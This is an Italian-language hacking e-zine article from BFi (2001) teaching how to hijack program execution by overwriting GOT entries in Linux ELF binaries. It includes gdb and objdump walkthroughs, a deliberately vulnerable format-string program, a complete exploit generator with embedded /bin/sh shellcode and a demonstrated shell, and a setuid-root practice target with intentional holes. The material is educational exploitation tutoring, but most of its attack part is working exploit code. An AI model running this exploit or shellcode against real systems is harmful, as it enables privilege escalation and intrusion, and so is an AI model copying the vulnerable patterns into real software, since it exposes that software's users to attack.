@@ -1,0 +1,614 @@
+==============================================================================
+-----------[ BFi numero 10, anno 4 - 30/09/2001 - file 7 di 18 ]--------------
+==============================================================================
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ N0N E` TUTT0 HEAP QUELL0 CHE N0N E` STACK
+-----[ Nail <nail@itapac.net>
+
+
+- Prima di tutto, i ringraziamenti:
+  gli abitanti di #k*, di #k* e di #social(specialmente zenparse e hcl)
+  il team di salumeria di #sikurezza@undernet.
+  tutti i mistici e la redazione di BFi.
+  stakka&skynet perche' le loro tracce fanno paura ;) 
+  gli ozric tentacles perche' sono rilassantissimi.
+  .. direi che bastano perche' ho citato mezzo mondo in 3 righe :P 
+  
+
+Prerequisiti:
+  - Perfetta conoscenza del C :)
+  - Concetto di stack, di heap e di bss
+  - Stack e format based overflows
+  - Un'infarinatura di gdb
+  - Voglia di imparare.
+
+
+-1. Di cosa stiamo parlando
+
+All'inizio era lo stack. Lo stack overflow intendo :)
+Dopo venne l'heap (ed il bss), cioe' tutta quella parte di memoria sempre
+valida che non era stack.
+Poi vennero le format string, ma stiamo parlando di tecniche completamente 
+diverse.
+Per cui, a rigor di logica, cio' che non e' stack, e' heap.
+E questo limiterebbe appunto i buffer overrun a stack ed heap.
+Ma ne siamo proprio sicuri?
+Proviamo a far partire un qualsiasi programma e a curiosare la sua entry nel
+proc filesystem.
+
+[/proc/342] $ ls
+cmdline  cpu  cwd@  environ  exe@  fd/  maps|  mem  root@  stat  statm  status
+
+maps, un file dimenticato da molti, ma utilissimo.
+Esso infatti contiene le varie porzioni di memoria associate fin dal run a 
+quel processo e che proprieta' esse abbiano (r/w/x):
+
+08048000-08049000 r-xp 00000000 03:06 148024     /home/nail/timer
+08049000-0804a000 rw-p 00000000 03:06 148024     /home/nail/timer
+40000000-40013000 r-xp 00000000 03:05 5982       /lib/ld-2.1.3.so
+40013000-40014000 rw-p 00012000 03:05 5982       /lib/ld-2.1.3.so
+40014000-40015000 rw-p 00000000 00:00 0
+4001c000-400fe000 r-xp 00000000 03:05 5993       /lib/libc-2.1.3.so
+400fe000-40102000 rw-p 000e1000 03:05 5993       /lib/libc-2.1.3.so
+40102000-40107000 rw-p 00000000 00:00 0
+bfffe000-c0000000 rwxp fffff000 00:00 0
+
+Bene, forse non e' tutto heap quello che non e' stack :)
+E ovviamente, e' tutta da esplorare (where no man has gone before... hem, 
+qualcuno c'e' gia' andato mi sa... si'... ho trovato un preservativo usato 
+per terra :P)
+
+
+0. Struttura di un ELF.
+
+Quella porzione di memoria di cui parlavamo e' destinata a contenere alcune 
+tabelle proprietarie del formato ELF per la rilocazione.
+Ovviamente questa frase puo' sembrare roba che si mangia senza un'opportuna 
+spiegazione, per cui.. :)
+
+Ogni programma compilato come ELF contiene soltanto il codice delle funzioni 
+scritte da noi (es. il main) mentre tutte le funzioni di libreria (printf, 
+strcpy,...) rimangono in una shared library esterna (le libc) e vengono poi 
+caricate in memoria soltanto quando servono.
+Questo quindi non ci permette di sapere la posizione assoluta del reale 
+codice di una chiamata in una library esterna.
+La soluzione e' quindi caricare la parte di libreria esterna solo quando 
+strettamente necessario e ricavare dall'header della libreria il puntatore al
+codice necessario.
+Il nostro codice ovviamente da qualche parte deve jumpare per chiamarle...
+Allora ecco che sono nate la GOT e la PLT.
+
+GOT = Global Offset Table
+PLT = Procedure Linkage Table
+
+Queste due tabelle fanno parte della cosiddette 'dynamic relocation entries'
+del nostro eseguibile.
+Sintetizzando dalla bibba degli ELF (127 kb di pdf, li mortacci...):
+La GOT e' una tabella che puo' essere visualizzata con un bel objdump -R 
+sull'eseguibile e contiene una specie di mappa che collega simboli ad 
+indirizzi e a come accedere a quell'indirizzo.
+Esempio:
+./timer:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+[...]
+0804976c R_386_JUMP_SLOT   sleep
+08049770 R_386_JUMP_SLOT   __libc_start_main
+08049774 R_386_JUMP_SLOT   printf
+08049778 R_386_JUMP_SLOT   sscanf
+[...]
+
+Il tipo di rilocazione dipende anche da cosa stiamo rilocando, principalmente
+per le funzioni di libreria si usa soltanto l'R_386_JUMP_SLOT.
+Prendendo l'esempio: la funzione sscanf ha un'entry nella GOT all'indirizzo
+0x08049778.
+Quando un programma effettua una chiamata alla scanf(), in realta' passa 
+all'indirizzo associato nella jump table (il famoso offset).
+
+Questo permette di creare un 'wrapper' per le funzioni.
+Praticamente: io non chiamo la printf vera e propria, chiamo un indirizzo
+contenuto nella GOT. Questa funzione (chiamiamola wrapper) prima di tutto 
+carichera' in memoria la parte di libc contenente il codice della printf e poi
+lo richiamera'.
+
+Tutta la serie di procedure di wrapping e la procedura principale per caricare
+una determinata funzione e' contenuta nella PLT.
+Questo esempio penso vi chiarara' un pochino le idee (faccio riferimento alla 
+objdumpata di prima):
+
+$ gdb ./timer
+(gdb) x 0x08049778
+0x8049778 <_GLOBAL_OFFSET_TABLE_+40>:   0x0804840a
+/* questo vuol dire che la parte di PLT per il load della sscanf
+   e' all'indirizzo 0x0804840a */
+(gdb) disass 0x0804840a
+Dump of assembler code for function sscanf:
+0x8048404 <sscanf>:     jmp    *0x8049778
+0x804840a <sscanf+6>:   push   $0x38
+0x804840f <sscanf+11>:  jmp    0x8048384 <_init+48>
+/* presumibilimente, con push $0x38 si indica alla procedura di 
+   load della libreria l'indice della funzione desiderata o un 
+   suo offset, purtroppo non ho ancora trovato un modo per checkare
+   la veridicita' di questa cosa.
+   All'indirizzo 0x8048384 dovrebbe essere contenuta la procedura di load
+*/
+(gdb) disass 0x8048384
+Dump of assembler code for function _init:
+[...]
+0x8048382 <_init+46>:   ret
+0x8048383:      Cannot access memory at address 0x8048383
+/* per accedere a quella parte di memoria ci vuole un piccolo trucco :P */
+(gdb) disass 0x8048384 0x80483aa
+Dump of assembler code from 0x8048384 to 0x80483aa:
+0x8048384 <_init+48>:   pushl  0x8049754
+0x804838a <_init+54>:   jmp    *0x8049758
+/* Ok, chiamiamo di nuovo qualcosa all'interno della GOT passandogli
+   l'indirizzo della funzione che dovremo poi richiamare ... */
+
+Mi fermo qua poiche' il gdb non e' in grado di caricare le shared library a 
+runtime :(
+
+Ok, spero di essere stato chiaro quindi.
+
+1. Vantaggi e svantaggi di queste aree di memoria
+
+La GOT e PLT hanno praticamente solo vantaggi :)
+a) Sono allocate in una zona di memoria mappata sempre sia come writable che 
+   come executable.
+b) Hanno indirizzi _FISSI_ ottenibili senza nemmeno dover runnare il programma
+   (objdump -R).
+
+Questi sono i vantaggi 'neutri'.
+Vediamo quelli *cattivi* :)
+
+a) Essendo sempre writable e executable in caso di patch come quelle di Solar
+   Designer per lo stack non eseguibile possiamo tranquillamente deviare 
+   l'esecuzione del processo.
+   Inoltre, abbiamo anche un posto dove scrivere lo shellcode ;)
+   (in realta' basterebbero 4 stupidi byte)
+
+b) Non overwritando il RET della funzione non necessita che tutta la funzione 
+   venga eseguita prima di saltare allo shellcode.
+   Quindi, se ci sono controlli tipo canaries, possiamo tranquillamente 
+   evitarli, poiche' l'esecuzione deviera' prima.
+
+c) L'uso della GOT/PLT puo' essere combinato perfettamente sia con altre 
+   tecniche di overflow.
+
+d) Il guess degli indirizzi praticamente sparisce, poiche' gli indirizzi
+   sono fissi.
+
+e) NON VI BASTA ANCORA? :))
+
+2. Esempi pratici
+
+Ok, ora che ci siamo fatti un po' di teoria mettiamo mano al nostro
+compilatore e al nostro vim (VERO CHE USATE VIM?).
+Cominciamo a fare delle prove un po' forzate... nel senso di provare a
+sostituire manualmente un qualche indirizzo di funzione.
+Se avete mai visto gli heap-based buffer overflow il funzionamento e' molto, 
+molto simile al sovrascrivere un puntatore a funzione, solo che sovrascrivi 
+l'indirizzo della funzione stessa :)
+Il fattore di difficolta' e' soltanto uno...
+Riassumendo un attimo lo stato della memoria:
+
+indirizzo piu' basso: -------------------- 0xbe000000 circa
+		      | 		 |
+		      |	     STACK       |
+		      |			 |
+		      -------------------- 0xc0000000 circa
+		      | ................ |
+		      | ................ |
+		      | ................ |
+		      -------------------- 0x08040000 circa
+		      |			 |
+		      |    TEXT AREA     |
+		      | 		 | 
+		      -------------------- 0x08048000 circa
+		      |                  |
+		      |  GOT/PLT/...     | 
+		      |  		 |
+	              -------------------- 0x80490000 circa
+		      |                  |
+		      |    BSS/HEAP      |
+		      |                  |
+		      -------------------- ...
+
+Come vedete, dall'heap e' impossibile raggiugnere la GOT poiche' e' prima... 
+mentre dallo stack siamo troppo lontani.
+Il risultato e': come ci arrivo? Bhe... questo lo vedremo nel prossimo 
+paragrafo... modi ce ne sono e l'inventiva umana supera qualsiasi distanza *g*
+Per ora evitiamo questo problema e proviamo:
+
+<-| gotplt/boh.c |->
+#include <stdio.h>
+#include <stdlib.h>
+
+food()
+{
+	printf("ciambelleeee..\n");
+}
+
+main()
+{
+	long int *got = 0x11223344; /* per ora lo lasciamo vuoto... */
+		
+	*got = (long int)food;
+	exit(0);
+}
+<-X->
+
+Compiliamo con -ggdb e objdumpiamo...
+Il nostro scopo ovviamente e' sovrascrivere l'indirizzo della exit nella GOT.
+
+$ objdump -R ./boh
+[...]
+08049550 R_386_JUMP_SLOT   exit
+[...]
+
+Adesso andiamo a modificare quella variabile:	
+
+long int *got = 0x08049550;
+
+E lanciamo il nostro programma con il gdb...
+(gdb) break main
+Breakpoint 1 at 0x8048442: file boh.c, line 13.
+(gdb) run
+Starting program: /home/nail/./boh
+warning: Unable to find dynamic linker breakpoint function.
+GDB will be unable to debug shared library initializers
+and track explicitly loaded dynamic code.
+
+Breakpoint 1, main () at boh.c:13
+13              *got = (long int)food;
+(gdb) x 0x8049550
+
+0x8049550 <_GLOBAL_OFFSET_TABLE_+28>:   0x08048342
+
+(gdb) disass exit
+Dump of assembler code for function exit:
+0x4003c79c <exit>:      push   %ebp
+0x4003c79d <exit+1>:    mov    %esp,%ebp
+[...]
+ 
+Come vedete, prima di fare quell'assegnamento, il gdb trasparente chiama la 
+funzione nella PLT e poi disassembla il codice della REALE exit.
+Ora sostiuiamo l'indirizzo nella GOT.
+
+(gdb) n
+14              exit(0);
+(gdb) disass exit
+Dump of assembler code for function exit:
+0x4003c79c <exit>:      push   %ebp
+0x4003c79d <exit+1>:    mov    %esp,%ebp
+[...]
+
+Gia' il gdb e' talmente stupido che non si accorge nemmeno che la GOT e' 
+cambiata... cmq...
+Se andiamo a vedere nella GOT...
+
+(gdb) x 0x8049550
+0x8049550 <_GLOBAL_OFFSET_TABLE_+28>:   0x08048420
+
+Bhe direi che ha funzionato :)
+Proviamo a lanciarlo e basta:
+
+$ ./boh
+ciambelleeee..
+
+Bello, non un crash, tutto liscio, addirittura l'esecuzione del programma
+avrebbe continuato.
+Cos'e' successo?
+Al chiamare della exit(), il programma cerca l'entry per la rilocazione nella
+GOT, trova la locazione 0x08049560 che corrisponde alla funzione cercata, 
+dopodiche' salta all'indirizzo contenuto in quella locazione. Qui arriva la 
+nostra modifica, che fa saltare il programma ignaro di tutto alla nostra 
+succulenta food(), invece che all'entry nella PLT che gestisce la exit().
+
+
+3. Come sfruttarli (semplice ormai)
+
+Per chi ha un pochino di familiarita' con gli overflow e' molto semplice
+sfruttare la GOT per deviare l'esecuzione del programma.
+Mettiamo il caso che vogliamo deviare la printf, prendiamo la locazione nella
+GOT dove c'e' l'indirizzo della printf e lo overwritiamo con l'indirizzo dello
+shellcode.
+Solitamente l'unico problema sta nell'indirizzare il programma a scrivere li',
+poiche' si tratta di una zona di memoria precedente l'heap (quindi non si puo'
+raggiungere dall'heap).
+Un modo puo' essere utilizzare i format bug, un altro la tecnica del doppio 
+overflow (stack + heap).
+
+4a. Format GOT bugs 
+
+<-| gotplt/fmt.c |->
+#include <stdio.h>
+#include <stdlib.h>
+
+void work(char *s)
+{
+	printf(s);
+	exit(0);
+}
+int main() {
+        char buf[2048];
+        printf("buf is located @ %p\n", buf);
+        fgets(buf,sizeof(buf), stdin);
+	buf[strlen(buf)-1] = 0; /* strip \n */
+	work(buf);
+}
+<-X->
+
+Come vedete un semplice format buffer overflow non funzionerebbe.
+Fatta la printf, si modificherebbe il ret della work() che pero' non verrebbe 
+mai raggiunto poiche' la exit() terminerebbe forzatamente il programma.
+L'unico modo e' sostiuire la exit con il nostro shellcode *g*.
+Per di piu' abbiamo solo l'imbarazzo della scelta: possiamo usare sia la GOT 
+stessa per infilare lo shellcode, oppure infilarlo in 'buf'.
+Gia' che abbiamo anche l'indirizzo, possiamo metterlo in buf (hey, e' una cosa
+educativa, chissenefotte se ci stampa l'address :D).
+Il nostro buffer deve quindi contenere lo shellcode (magari anche qualche nop
+;P) e andare a scrivere nella GOT l'indirizzo dello stesso.
+Innanzitutto prendiamoci l'indirizzo della exit:
+
+$ objdump -R ./fmt
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+080495c4 R_386_GLOB_DAT    __gmon_start__
+08049668 R_386_COPY        stdin
+080495ac R_386_JUMP_SLOT   __register_frame_info
+080495b0 R_386_JUMP_SLOT   __deregister_frame_info
+080495b4 R_386_JUMP_SLOT   fgets
+080495b8 R_386_JUMP_SLOT   __libc_start_main
+080495bc R_386_JUMP_SLOT   printf
+080495c0 R_386_JUMP_SLOT   exit
+
+Ci sono moltissimi modi per fare la format string.
+Ho scelto quello piu' classico e diffuso: scrivere i bytes in modo 
+incrementale:
+<ADDR><ADDR+1><ADDR+2><ADDR+3><byte1 - 16 -2><\xeb\x08>%<distanza>$n
+<byte2 - byte1 - 2><\xeb\x08>%<distanza+1>$n<byte3-byte2><\xeb\x08>
+%<distanza+2>$n<byte4-byte3+0x100-2><\xeb\x08>%<distanza+3>$n<shellcode>
+
+ADDR e' l'indirizzo a cui dobbiamo andare a scrivere (0x08049590).
+Per chi non lo sapesse, \xeb\x08 e' un jump relativo 8 byte piu' avanti.
+Questo permette di andare a prendere in uno qualsiasi dei nop e saltare i %n 
+(a meno che non si sia sfigati assai e si cada direttamente sul %n :)).
+Utilizzando %num$x si prende il num-esimo elemento nello stack.
+(Rimando ai paper di scut, lamagra e pb per ulteriori informazioni).
+
+$ ./fmt
+buf is located @ 0xbffff1d8
+
+Per cui diciamo che possiamo scrivere 0xbffff1e2 tranquillamente.
+Ora cerchiamo la format string all'interno dello stack:
+$ ./fmt
+buf is located @ 0xbffff1d8
+AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+AAAA0x400137500xbffff9d80x80484c20xbffff7d80x2000xbffff9d80x80484ce0xbffff7d80x
+bffff7d80x400131540x400002300x401009b40xbffffa140x2(nil)0x400013100x2c80x414141
+41
+
+Per cui distanza = 18.
+(infatti:
+buf is located @ 0xbffff1d8
+AAAA%18$p
+AAAA0x41414141)
+
+A questo punto abbiamo tutti i dati per costruire il nostro exploit.
+
+<-| gotplt/got.c |->
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+char linuxsc[] = /* just aleph1's old shellcode (linux x86) */
+      "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0"
+      "\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
+      "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+int num(int n)
+{
+        if(n < 10) return 1;
+        if(n < 100) return 2;
+        if(n < 1000) return 3;
+}
+int
+main(int argc, char **argv)
+{
+        char a[256],b[256],c[256],d[400], buf[1024];
+        long int what, where;
+        int what0, what1, what2, what3, dist;
+
+        bzero(a, sizeof(a));
+        bzero(b, sizeof(b));
+        bzero(c, sizeof(c));
+        bzero(d, sizeof(d));
+        bzero(buf, sizeof(buf));
+
+        if(argc != 4)
+        {
+                printf("Usage: %s <what> <where> <distance>\n",argv[0]);
+                exit(0);
+        }
+
+	/* recuperiamo i nostri indirizzi */
+	/* what e' cosa va scritto, where dove :) */
+        sscanf(argv[1], "%lx", &what);
+        sscanf(argv[2], "%lx", &where);
+        dist = atoi(argv[3]);
+
+	/* dividiamo l'indirizzo */
+        what0 = (what & 0xff);
+        what1 = (what >> 8) & 0xff;
+        what2 = (what >> 16) & 0xff;
+        what3 = (what >> 24) & 0xff;
+
+	/* riempiamo un buffer per ogni byte da scrivere */
+        memset(a, '\x90',what0 - 2 - 16);
+        sprintf(a+strlen(a), "\xeb\x08%%%d$n", dist);
+        memset(b, '\x90',what1 - what0 - 2);
+        sprintf(b+strlen(b), "\xeb\x08%%%d$n", dist+1);
+        memset(c, '\x90',what2 - what1 - 2);
+        sprintf(c+strlen(c), "\xeb\x08%%%d$n", dist+2);
+        memset(d, '\x90',0x100 + what3 - what2 - 2);
+        sprintf(d+strlen(d), "\xeb%c%%%d$n", num(dist)+3, dist+3);
+	/* questo e' difficile :) il salto dev'essere preciso
+ 	   in modo da beccare in pieno lo shellcode.
+           si poteva anche semplicemente mettere ancora qualche NOP
+           ma odio le cose semplici :P */
+
+	/* inseriamo i 4 indirizzi */
+        *(long int *)buf     = where;
+        *(long int *)(buf+4) = where+1;
+        *(long int *)(buf+8) = where+2;
+        *(long int *)(buf+12)= where+3;
+	/* tutto il resto e lo shellcode */
+        sprintf(buf+16, "%s%s%s%s%s",
+                a,b,c,d,linuxsc);
+
+	/* printiamo */
+        printf("%s\n", buf);
+        return 0;
+}
+<-X->
+
+$ (./got 0xbffff223 0x080495c0 18 ; cat - ) | ./fmt
+buf is located @ 0xbffff1d8
+id
+uid=1000(nail) gid=100(users) groups=100(users),3(sys)
+
+whoooo ooooooooooooooooo :)
+Risultato: la exit() e' diventata il nostro shellcode :D
+
+4b. Doppio overflow (stack+got)
+
+Questo e' un metodo un po' particolare... anzi penso che piu' che un metodo
+sia un trucchetto molto carino.
+Infatti per essere attuato richiede ben precise condizioni.
+In poche parole, si tratta di overwritare un puntatore nello stack in modo che
+una successiva lettura porti a scrivere nella GOT.
+Esempio:
+
+char *msg;
+char buf[256];
+[...]
+msg = malloc(2048);
+strcpy(buf, argv[1]);
+fgets(msg, 2048, stdin);
+
+Con la strcpy possiamo sovrascrivere l'indirizzo di msg con quello che ci 
+serve (l'indirizzo a cui dovremmo scrivere all'interno della GOT).
+Con la fgets poi inseriremo nella GOT tutto quello che ci serve.
+Ovviamente perche' tutto cio' accada bisogna che:
+
+a) il puntatore sia raggiungibile nello stack dal primo buffer;
+b) il puntatore non venga modificato tra lo stack overflow e la scrittura 
+   all'interno della GOT (se la malloc fosse stata dopo la strcpy sarebbe 
+   stato impossibile);
+c) il puntatore sia ovviamente a nostra disposizione per inserire dati.
+
+Di questo metodo non faro' un esempio, lo lascio fare a voi *g*.
+Qui sotto potete trovare un programma abbastanza semplice su cui fare 
+esercizio.
+E ricordate, 'exploiting is an art'.
+Ci sono milioni di modi di arrivare allo stesso risultato, sta a voi 
+scegliere e, ovviamente, riuscirci :)
+
+Salud :)
+			Nail
+
+<-| gotplt/proggie.c |->
+/* ovviamente:
+   # gcc -o proggie proggie.c -lcrypt
+   # chown root ./proggie
+   # chmod 4755 ./proggie
+   # su - user
+   $ vi exploit.c
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <pwd.h>
+#include <string.h>
+#include <shadow.h>
+
+char *
+scheck(char *u)
+{
+	struct spwd *s;
+
+	s = getspnam(u);
+	if(!s)
+		return NULL;
+	return s->sp_pwdp;
+}
+
+
+int check(char *u, char *pwd)
+{
+	struct passwd *p;
+	char *cpwd;
+	
+	p = getpwnam(u);
+	if(!p)
+		return 0;
+	if(strlen(p->pw_passwd)==1)
+		p->pw_passwd = scheck(u);
+	if(!p->pw_passwd)
+		return 0;
+	cpwd = (char *)crypt(pwd, p->pw_passwd);
+	if(strcmp(cpwd, p->pw_passwd))
+		return 0;
+	p = getpwnam("nobody");
+	return p->pw_uid;
+}
+	
+main()
+{
+	long int count = 0;
+	int id;
+	char *passwd = NULL;	
+	char prompt[200];
+	char user[256];
+
+	printf("Insert your password length: ");
+	fflush(stdout);
+	fgets(user, sizeof(user), stdin);
+	user[strlen(user)-1] = 0;
+	count = atoi(user)+2; /* to get \n and \0 */
+	passwd = (char *)malloc(count+1);
+	
+	printf("Insert your username: ");
+	fflush(stdout);
+	fgets(user, sizeof(user), stdin);
+	user[strlen(user)-1] = 0;
+	sprintf(prompt, "Insert password for localhost:%s", user);
+	printf("%s: ", prompt);
+
+	if(count > 16)
+	{
+		printf("Your password is too long.\n");
+		exit(0);
+	}
+	fgets(passwd, count, stdin);
+        passwd[strlen(passwd)-1] = 0;
+	if((id = check(user, passwd)))	{
+		printf("You are logged in!!!\n");
+		setuid(id);
+		system("/bin/sh -i");
+		exit(0);
+	} else 
+		printf("Error.\n");
+		
+}
+<-X->
+
+
+==============================================================================
+--------------------------------[ EOF  7/18 ]---------------------------------
+==============================================================================
+ 
